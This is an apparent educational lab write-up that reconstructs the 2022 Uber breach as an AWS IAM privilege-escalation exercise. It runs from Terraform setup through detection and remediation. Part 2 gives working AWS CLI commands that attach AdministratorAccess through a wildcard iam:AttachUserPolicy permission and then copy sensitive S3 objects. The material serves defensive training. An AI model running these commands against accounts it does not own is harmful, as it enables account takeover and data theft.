# Case #02 — IAM Privilege Escalation: How an 18-Year-Old Took Over Uber's AWS

> **Series:** The AWS Autopsy — Real Cloud Breaches, Dissected
> **Difficulty:** Intermediate
> **Lab Time:** ~45 minutes
> **AWS Cost:** Near zero (t2.micro — free tier eligible)
>
> **GitHub:** [AWS-Autopsy | Case #02](https://github.com/ridamdarji25/AWS-Autopsy/tree/main/Case-02-IAM-PrivEsc-Uber)

---

## ⚠️ Legal & Ethical Disclaimer

**Read this before proceeding.**

This article and the accompanying lab are created **strictly for educational and defensive security research purposes.**

- ✅ Run this lab **only** on AWS infrastructure you personally own
- ✅ This is intended to help security professionals **understand and defend** against real attack vectors
- ❌ Do **not** use any technique shown here on systems you do not own
- ❌ Do **not** use this for any malicious, unauthorized, or illegal activity
- ❌ Unauthorized access to computer systems is a **criminal offense** in most countries

By continuing, you agree that you are using this content solely for ethical security research and education.

> The author takes no responsibility for any misuse of the information presented in this article.

---

## The Victim

| Field | Details |
|---|---|
| **Organisation** | Uber Technologies, Inc. |
| **Date** | September 2022 |
| **Attacker** | 18-year-old threat actor (alias: "teapotuberhacker") |
| **Data Exposed** | Rider PII, financial records, internal dashboards, HackerOne private bug reports |
| **Root Cause** | MFA fatigue + hardcoded PAM credentials + wildcard `iam:AttachUserPolicy` |
| **Attack Complexity** | LOW |
| **Preventability** | 100% |

---

## The Story

Most people assume a full cloud takeover requires a nation-state actor, a zero-day, or months of reconnaissance.

Uber's entire AWS environment was compromised in an afternoon. By an 18-year-old. Using three mistakes that exist in thousands of environments right now.

The attacker obtained a contractor's credentials, bypassed push-based MFA through fatigue and social engineering, discovered hardcoded PAM credentials on an internal network share, and used those to unlock Uber's Privileged Access Manager — which held admin-level IAM keys for AWS.

With those keys, a single AWS CLI command was all it took:

```bash
aws iam attach-user-policy \
  --user-name attacker \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

Low-privilege user → god-mode. Under 15 seconds.

Then they posted the breach announcement in Uber's own `#announcements` Slack channel. Employees thought it was a prank — until they checked their systems.

---

## The Kill Chain

```plaintext
[Attacker]
    │
    │  Step 1: Credential stuffing / phishing → contractor creds obtained
    ▼
[MFA Push Fatigue + Social Engineering]
    │
    │  Repeated push bombs → contractor approves → VPN access gained
    ▼
[Internal Network Share — PowerShell Script]
    │
    │  Hardcoded PAM credentials found in plaintext script
    ▼
[PAM Vault — Privileged Access Manager]
    │
    │  Admin AWS IAM keys, GCP keys, Google Workspace, AD — all unlocked
    ▼
[AWS IAM — iam:AttachUserPolicy on Resource: *]
    │
    │  attach-user-policy AdministratorAccess → instant privilege escalation
    ▼
[Full AWS Account — AdministratorAccess]
    │
    │  ListBuckets → GetObject → full S3 exfiltration
    ▼
[Blast Radius: Rider PII + Financial Data + HackerOne Reports + Slack]
```

**Attack Complexity:** LOW
**Preventability:** 100%

---

## Lab Architecture

This lab isolates and replicates the IAM privilege escalation vector from the Uber breach:

- **`yourname-attacker-user`** — a low-privilege IAM user with one dangerous permission: `iam:AttachUserPolicy` on `Resource: *`
- **`yourname-sensitive-bucket`** — a private S3 bucket containing simulated PII, financial records, and a mock HackerOne-style vulnerability list
- **`yourname-permission-boundary`** — a boundary policy pre-built for the remediation phase (Fix 2)
- **`yourname-attacker-policy`** — the vulnerable IAM policy attached to the attacker user

> Starting state: the attacker user has zero S3 access. One IAM command changes everything.

📸 *[Lab architecture diagram — add screenshot here]*

---

## Prerequisites

- AWS account (free tier works)
- AWS CLI v2 configured (`aws configure`) with an admin profile for initial setup
- Terraform v1.3+ installed
- Basic familiarity with IAM and S3

---

## Part 1 — Lab Setup

> **Clone the repository:**

```bash
git clone https://github.com/ridamdarji25/AWS-Autopsy.git
cd AWS-Autopsy/Case-02-IAM-PrivEsc-Uber/terraform
```

📸 *[Screenshot: repo cloned, directory structure visible]*

---

> **Open `terraform.tfvars` and set your unique prefix:**

```hcl
prefix     = "yourname"   # ← change this to your name (e.g. "ridam")
aws_region = "us-east-1"
```

Why prefix? Every resource uses your prefix — `yourname-attacker-user`, `yourname-sensitive-bucket`, `yourname-attacker-policy` — so there are no naming conflicts if multiple people run the lab simultaneously.

📸 *[Screenshot: terraform.tfvars open with prefix set]*

---

> **Deploy the lab:**

```bash
terraform init
terraform plan
terraform apply
```

Type `yes` when prompted.

📸 *[Screenshot: terraform apply output — resources created]*

---

> **Note the outputs:**

```plaintext
attacker_access_key_id      = "AKIA5XXXXXXXXXXXXXXXXX"
attacker_secret_access_key  = <sensitive>
sensitive_bucket_name       = "yourname-sensitive-bucket"
attacker_user_name          = "yourname-attacker-user"
attacker_policy_arn         = "arn:aws:iam::123456789012:policy/yourname-attacker-policy"
permission_boundary_arn     = "arn:aws:iam::123456789012:policy/yourname-permission-boundary"
```

---

> **Configure the attacker AWS profile:**

```bash
# Get the secret key
terraform output -raw attacker_secret_access_key

# Configure the attacker profile
aws configure --profile attacker
# AWS Access Key ID:     (from terraform output attacker_access_key_id)
# AWS Secret Access Key: (from command above)
# Default region name:   us-east-1
# Default output format: json
```

📸 *[Screenshot: aws configure --profile attacker completed]*

---

## Part 2 — The Attack

> ⚠️ Perform these steps only on your own lab. This is your infrastructure, your account.

---

### Step 1 — Verify Identity: You Are Nobody

```bash
aws sts get-caller-identity --profile attacker
```

Expected output:

```json
{
    "UserId": "AIDAXXXXXXXXXXXXXXXXX",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/yourname-attacker-user"
}
```

A low-privilege user. No meaningful access. Yet.

📸 *[Screenshot: get-caller-identity output showing attacker-user]*

---

### Step 2 — Confirm No Access to Sensitive Bucket

```bash
aws s3 ls s3://yourname-sensitive-bucket --profile attacker
```

Expected output:

```plaintext
An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
```

This is the starting state. The attacker can't touch the bucket.

📸 *[Screenshot: Access Denied on sensitive bucket]*

---

### Step 3 — Enumerate Permissions

```bash
aws iam list-attached-user-policies \
  --user-name yourname-attacker-user \
  --profile attacker
```

📸 *[Screenshot: list-attached-user-policies output]*

Inspect the policy contents:

```bash
# Use the policy ARN from the output above
aws iam get-policy-version \
  --policy-arn <policy-arn-from-output> \
  --version-id v1 \
  --profile attacker
```

Buried in the policy statements:

```json
{
  "Sid": "DANGEROUS-AllowPolicyAttach",
  "Effect": "Allow",
  "Action": ["iam:AttachUserPolicy"],
  "Resource": "*"
}
```

There it is. `iam:AttachUserPolicy` scoped to `Resource: *`.
That's the loaded gun.

📸 *[Screenshot: policy document showing iam:AttachUserPolicy on Resource:*]*

---

### Step 4 — EXPLOIT: Attach AdministratorAccess

```bash
aws iam attach-user-policy \
  --user-name yourname-attacker-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile attacker
```

No error. No confirmation. No alarm.

It just works.

📸 *[Screenshot: attach-user-policy command succeeding silently]*

---

### Step 5 — Verify the Escalation

```bash
aws iam list-attached-user-policies \
  --user-name yourname-attacker-user \
  --profile attacker
```

`AdministratorAccess` is now attached alongside the original policy. Same user. Same session. Full admin.

📸 *[Screenshot: AdministratorAccess now listed in attached policies]*

---

### Step 6 — Access the Sensitive Bucket

```bash
# List the bucket
aws s3 ls s3://yourname-sensitive-bucket --profile attacker

# List recursively
aws s3 ls s3://yourname-sensitive-bucket --recursive --profile attacker
```

Expected output:

```plaintext
2024-01-01 10:00:00    204 financial/q3-2022-revenue.txt
2024-01-01 10:00:00    512 rider-pii/user-data-2022.csv
2024-01-01 10:00:00    318 security/unpatched-vulns.txt
```

📸 *[Screenshot: full S3 listing now accessible after escalation]*

---

### Step 7 — Download and View the Stolen Data

```bash
# Download all files
aws s3 cp s3://yourname-sensitive-bucket/financial/q3-2022-revenue.txt . --profile attacker
aws s3 cp s3://yourname-sensitive-bucket/rider-pii/user-data-2022.csv . --profile attacker
aws s3 cp s3://yourname-sensitive-bucket/security/unpatched-vulns.txt . --profile attacker

# View the data
cat q3-2022-revenue.txt
cat user-data-2022.csv
cat unpatched-vulns.txt
```

📸 *[Screenshot: downloaded files and contents visible — PII, financial data, vuln list]*

---

> **💀 Attack complete.**

One permission. One command. Zero malware. Zero exploits.

In the real Uber breach — HackerOne private bug reports, internal Slack, rider PII across regions. All of it.

---

## Part 3 — Detection

What should have caught this?

### GuardDuty — Privilege Escalation Finding

GuardDuty raises:

`Policy:IAMUser/RootCredentialUsage` and `PrivilegeEscalation:IAMUser/AdministrativePermissions`

These fire when unusual IAM permission changes are detected — specifically self-service policy attachments outside normal admin workflows.

```bash
# Enable GuardDuty
aws guardduty create-detector --enable --region us-east-1
```

---

### CloudTrail — What to Look For

In CloudTrail, look for:

- `AttachUserPolicy` events where the caller and target user are the **same principal**
- `AttachUserPolicy` events attaching AWS managed policies (`aws:policy/AdministratorAccess`, `aws:policy/PowerUserAccess`)
- Any IAM write event from an unexpected source IP or at an unexpected time

---

### CloudTrail Athena Query

```sql
SELECT
  eventTime,
  userIdentity.arn,
  sourceIPAddress,
  eventName,
  requestParameters
FROM cloudtrail_logs
WHERE
  eventSource = 'iam.amazonaws.com'
  AND eventName = 'AttachUserPolicy'
  AND requestParameters LIKE '%AdministratorAccess%'
ORDER BY eventTime DESC
LIMIT 50;
```

Any `AttachUserPolicy` call targeting `AdministratorAccess` from a non-admin principal is a **critical red flag**.

### IAM Access Analyzer

IAM Access Analyzer would have flagged `iam:AttachUserPolicy` on `Resource: *` **before** any attacker ever had the chance to use it.

```bash
aws accessanalyzer create-analyzer \
  --analyzer-name autopsy-case02-analyzer \
  --type ACCOUNT
```

It scans all IAM policies automatically and surfaces privilege escalation paths as findings.

---

## Part 4 — Remediation

Three fixes. All minimal changes in Terraform.

---

### Fix 1 — Remove Wildcard from `iam:AttachUserPolicy`

**Before (vulnerable):**

```json
{
  "Effect": "Allow",
  "Action": ["iam:AttachUserPolicy"],
  "Resource": "*"
}
```

**After (fixed):**

```json
{
  "Effect": "Allow",
  "Action": ["iam:AttachUserPolicy"],
  "Resource": "arn:aws:iam::123456789012:user/specific-allowed-user"
}
```

Scope IAM write actions to explicit, named resources. Never `*`.

In `iam.tf`, update the `Resource` field and apply:

```bash
terraform apply
```

---

### Fix 2 — Apply a Permission Boundary (Kills the Attack Completely)

Permission boundaries set the **maximum** permissions a user can ever hold — regardless of what policies are attached. Even if an attacker attaches `AdministratorAccess`, the boundary overrides it.

```bash
# Apply the pre-built boundary from Terraform outputs
aws iam put-user-permissions-boundary \
  --user-name yourname-attacker-user \
  --permissions-boundary arn:aws:iam::123456789012:policy/yourname-permission-boundary
```

The boundary policy explicitly denies all IAM write actions:

```json
{
  "Sid": "DenyIAMWrite",
  "Effect": "Deny",
  "Action": [
    "iam:AttachUserPolicy",
    "iam:DetachUserPolicy",
    "iam:PutUserPolicy",
    "iam:CreatePolicy",
    "iam:CreatePolicyVersion",
    "iam:PassRole"
  ],
  "Resource": "*"
}
```

Now repeat Step 4 of the attack — you'll get `AccessDenied`. The escalation path is permanently closed.

📸 *[Screenshot: attach-user-policy returning Access Denied after boundary applied]*

---

### Fix 3 — IAM Access Analyzer + CloudTrail Always On

```hcl
# accessanalyzer.tf
resource "aws_accessanalyzer_analyzer" "main" {
  analyzer_name = "autopsy-case02-analyzer"
  type          = "ACCOUNT"
}

# cloudtrail.tf
resource "aws_cloudtrail" "autopsy_trail" {
  name                          = "autopsy-trail"
  s3_bucket_name                = aws_s3_bucket.trail_logs.id
  include_global_service_events = true
  is_multi_region_trail         = true
  enable_log_file_validation    = true
}
```

---

### Verify the Fix

```bash
# Clean up the exploit first
aws iam detach-user-policy \
  --user-name yourname-attacker-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Attempt the exploit again
aws iam attach-user-policy \
  --user-name yourname-attacker-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile attacker
# Expected: An error occurred (AccessDenied)
```

📸 *[Screenshot: exploit attempt returning Access Denied after fix]*

Attack path closed.

---

## Cleanup — Important

```bash
terraform destroy
```

This removes all IAM users, policies, boundaries, and S3 buckets created by the lab.

📸 *[Screenshot: terraform destroy output — all resources removed]*

---

## The 5 Lessons from Case #02

**1/ `iam:AttachUserPolicy` on `Resource: *` is privilege escalation, not just a misconfiguration.** Any user with this permission can make themselves an administrator. Treat it like handing someone the root password.

**2/ Permission boundaries are your safety net.** They cap the blast radius of any IAM misconfiguration. Deploy them as organisational policy for all non-admin users — especially service accounts and automation users.

**3/ IAM Access Analyzer is free and catches these paths automatically.** There is no excuse for not enabling it in every account. It would have flagged this before any attacker found it.

**4/ Hardcoded credentials are a single file discovery away from full compromise.** Use AWS Secrets Manager. Use Parameter Store. Run `git-secrets` in your CI pipeline. Never hardcode credentials — not in scripts, not in config files, not in comments.

**5/ Push-based MFA is not phishing-proof.** MFA fatigue is trivially executed. FIDO2 passkeys and hardware security keys (YubiKey) are immune by design. If your organisation uses push notifications as the only MFA factor, you are one social engineering call away from a breach.

---

## What's Next

**Case #03 — Secrets Leaked on GitHub (Toyota + Multiple Orgs)**

> *A developer committed AWS keys to a public repo.*
> *They deleted the commit 5 minutes later.*
> *By then — it was already over.*
> *This is how mass cloud credential exposure happens, and how to stop it.*

Follow on [LinkedIn](https://linkedin.com/in/ridamdarji) and [Hashnode](https://awsautopsy.hashnode.dev) so you don't miss it.

⭐ **Star the repo** to get notified when Case #03 drops → [github.com/ridamdarji25/AWS-Autopsy](https://github.com/ridamdarji25/AWS-Autopsy)

---

## References

- [Uber Security Incident — Official Statement (2022)](https://www.uber.com/newsroom/security-update/)
- [AWS IAM Privilege Escalation Paths — Rhino Security Labs](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [AWS IAM Permission Boundaries Documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_boundaries.html)
- [AWS IAM Access Analyzer Documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/what-is-access-analyzer.html)
- [GuardDuty IAM Finding Types](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-iam.html)
- [MITRE ATT&CK — Valid Accounts: Cloud Accounts (T1078.004)](https://attack.mitre.org/techniques/T1078/004/)

---

*The AWS Autopsy is an educational series on real cloud security incidents. Every technique demonstrated is for defensive security research only. Always obtain proper authorisation before testing any system you do not own.*

*Found this useful? Share it with your team. Every AWS engineer should run this lab at least once.*

---

**Tags:** `aws` `cloud-security` `ethical-hacking` `terraform` `devsecops` `iam` `privilege-escalation` `security-research`
